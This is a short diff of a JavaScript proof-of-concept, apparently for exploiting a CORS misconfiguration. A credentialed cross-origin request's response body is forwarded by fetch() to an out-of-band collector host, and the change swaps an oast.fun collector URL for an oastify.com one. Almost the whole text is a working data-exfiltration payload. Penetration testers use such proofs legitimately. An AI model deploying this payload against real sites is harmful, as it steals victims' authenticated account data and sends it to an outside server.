@@ -5,5 +5,5 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    fetch(('https://ck2rp5g2vtc00000argggjtcmnhyyyyyb.oast.fun/?xxx='+this.responseText))
+    fetch(('https://onfb5ongcasd9gick75i64dpigo9c10q.oastify.com/?xxx='+this.responseText))
 };
